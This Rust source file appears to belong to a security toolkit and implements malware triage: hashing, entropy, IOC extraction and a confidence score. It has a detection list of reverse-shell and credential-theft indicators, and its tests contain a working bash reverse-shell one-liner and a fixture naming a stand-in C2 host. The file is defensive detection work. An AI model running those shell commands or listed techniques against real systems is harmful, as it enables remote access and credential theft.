use regex::Regex;
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use crate::errors::RustpenError;

#[derive(Debug, Clone, Serialize)]
pub struct ShellIndicator {
    pub family: String,
    pub evidence: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct MalwareIocs {
    pub urls: Vec<String>,
    pub domains: Vec<String>,
    pub ipv4s: Vec<String>,
    pub file_paths: Vec<String>,
    pub emails: Vec<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct MalwareTriageReport {
    pub path: PathBuf,
    pub sha256: String,
    pub file_size: u64,
    pub entropy: f64,
    pub shell_indicators: Vec<ShellIndicator>,
    pub iocs: MalwareIocs,
    pub suspicious_keywords: Vec<String>,
    pub malware_confidence: u8,
}

pub struct MalwareAnalyzer;

impl MalwareAnalyzer {
    pub fn triage_file(path: &Path) -> Result<MalwareTriageReport, RustpenError> {
        let bytes = std::fs::read(path)?;
        let file_size = bytes.len() as u64;
        let entropy = shannon_entropy(&bytes);
        let sha256 = sha256_hex(&bytes);
        let strings = extract_ascii_strings(&bytes, 4, 20_000);

        let iocs = extract_iocs(&strings)?;
        let shell_indicators = extract_shell_indicators(&strings);
        let suspicious_keywords = extract_keyword_hits(&strings);
        let confidence = compute_confidence(
            entropy,
            shell_indicators.len(),
            iocs.urls.len() + iocs.domains.len() + iocs.ipv4s.len(),
            suspicious_keywords.len(),
        );

        Ok(MalwareTriageReport {
            path: path.to_path_buf(),
            sha256,
            file_size,
            entropy,
            shell_indicators,
            iocs,
            suspicious_keywords,
            malware_confidence: confidence,
        })
    }

    pub fn audit_shell_text(content: &str) -> Vec<ShellIndicator> {
        let lines: Vec<String> = content.lines().map(|s| s.to_string()).collect();
        extract_shell_indicators(&lines)
    }
}

fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hex::encode(hasher.finalize())
}

fn shannon_entropy(bytes: &[u8]) -> f64 {
    if bytes.is_empty() {
        return 0.0;
    }
    let mut freq = [0usize; 256];
    for &b in bytes {
        freq[b as usize] += 1;
    }
    let n = bytes.len() as f64;
    let mut e = 0.0;
    for c in freq {
        if c == 0 {
            continue;
        }
        let p = c as f64 / n;
        e -= p * p.log2();
    }
    e
}

fn extract_ascii_strings(bytes: &[u8], min_len: usize, max_items: usize) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = Vec::new();
    for &b in bytes {
        if (0x20..=0x7e).contains(&b) {
            cur.push(b);
        } else {
            if cur.len() >= min_len {
                out.push(String::from_utf8_lossy(&cur).to_string());
                if out.len() >= max_items {
                    return out;
                }
            }
            cur.clear();
        }
    }
    if cur.len() >= min_len && out.len() < max_items {
        out.push(String::from_utf8_lossy(&cur).to_string());
    }
    out
}

fn extract_iocs(strings: &[String]) -> Result<MalwareIocs, RustpenError> {
    let url_re = Regex::new(r"https?://[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%-]+")
        .map_err(|e| RustpenError::ParseError(e.to_string()))?;
    let ip_re = Regex::new(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
        .map_err(|e| RustpenError::ParseError(e.to_string()))?;
    let domain_re = Regex::new(r"\b(?:[a-zA-Z0-9-]{1,63}\.)+(?:[a-zA-Z]{2,24})\b")
        .map_err(|e| RustpenError::ParseError(e.to_string()))?;
    let path_re = Regex::new(r#"(?:[A-Za-z]:\\[^\s"']+|/(?:usr|etc|var|tmp|home)/[^\s"']+)"#)
        .map_err(|e| RustpenError::ParseError(e.to_string()))?;
    let email_re = Regex::new(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,24}\b")
        .map_err(|e| RustpenError::ParseError(e.to_string()))?;

    let mut urls = BTreeSet::new();
    let mut ipv4s = BTreeSet::new();
    let mut domains = BTreeSet::new();
    let mut file_paths = BTreeSet::new();
    let mut emails = BTreeSet::new();

    for s in strings {
        for m in url_re.find_iter(s) {
            urls.insert(m.as_str().to_string());
        }
        for m in ip_re.find_iter(s) {
            ipv4s.insert(m.as_str().to_string());
        }
        for m in domain_re.find_iter(s) {
            domains.insert(m.as_str().to_string());
        }
        for m in path_re.find_iter(s) {
            file_paths.insert(m.as_str().to_string());
        }
        for m in email_re.find_iter(s) {
            emails.insert(m.as_str().to_string());
        }
    }

    Ok(MalwareIocs {
        urls: urls.into_iter().collect(),
        domains: domains.into_iter().collect(),
        ipv4s: ipv4s.into_iter().collect(),
        file_paths: file_paths.into_iter().collect(),
        emails: emails.into_iter().collect(),
    })
}

fn extract_shell_indicators(strings: &[String]) -> Vec<ShellIndicator> {
    let rules: [(&str, &str); 10] = [
        ("bash_reverse", "bash -i"),
        ("dev_tcp", "/dev/tcp/"),
        ("nc_exec", "nc -e"),
        ("ncat_exec", "ncat --exec"),
        ("python_shell", "python -c 'import socket"),
        ("perl_shell", "perl -e 'use Socket"),
        ("powershell_encoded", "powershell -enc"),
        ("powershell_iex", "invoke-expression"),
        ("cmd_exec", "cmd.exe /c"),
        ("curl_wget_pipe", "| sh"),
    ];

    let mut out = Vec::new();
    for s in strings {
        let lower = s.to_ascii_lowercase();
        for (family, pattern) in rules {
            if lower.contains(pattern) {
                out.push(ShellIndicator {
                    family: family.to_string(),
                    evidence: s.chars().take(180).collect(),
                });
            }
        }
    }
    out.truncate(128);
    out
}

fn extract_keyword_hits(strings: &[String]) -> Vec<String> {
    let keywords = [
        "keylogger",
        "inject",
        "process hollow",
        "mimikatz",
        "lsass",
        "credential",
        "ransom",
        "vssadmin",
        "wmic",
        "schtasks",
    ];

    let mut set = BTreeSet::new();
    for s in strings {
        let lower = s.to_ascii_lowercase();
        for k in keywords {
            if lower.contains(k) {
                set.insert(k.to_string());
            }
        }
    }
    set.into_iter().collect()
}

fn compute_confidence(
    entropy: f64,
    shell_hits: usize,
    ioc_count: usize,
    keyword_hits: usize,
) -> u8 {
    let mut score = 0.0;
    if entropy > 7.2 {
        score += 20.0;
    }
    score += (shell_hits as f64 * 8.0).min(32.0);
    score += (ioc_count as f64 * 1.5).min(24.0);
    score += (keyword_hits as f64 * 8.0).min(24.0);
    score.clamp(0.0, 100.0) as u8
}

#[cfg(test)]
mod tests {
    use super::MalwareAnalyzer;
    use std::io::Write;

    #[test]
    fn shell_audit_detects_reverse_shell_patterns() {
        let s = "bash -i >& /dev/tcp/10.0.0.2/4444 0>&1";
        let res = MalwareAnalyzer::audit_shell_text(s);
        assert!(!res.is_empty());
    }

    #[test]
    fn triage_extracts_iocs() {
        let path = std::env::temp_dir().join("rscan_malware_triage.bin");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "c2=http://evil.example.com/a?b=1").unwrap();
        writeln!(f, "connect 10.10.10.10").unwrap();
        writeln!(f, "powershell -enc AAAA").unwrap();

        let rep = MalwareAnalyzer::triage_file(&path).unwrap();
        assert!(!rep.iocs.urls.is_empty());
        assert!(!rep.iocs.ipv4s.is_empty());
        assert!(!rep.shell_indicators.is_empty());

        let _ = std::fs::remove_file(path);
    }
}
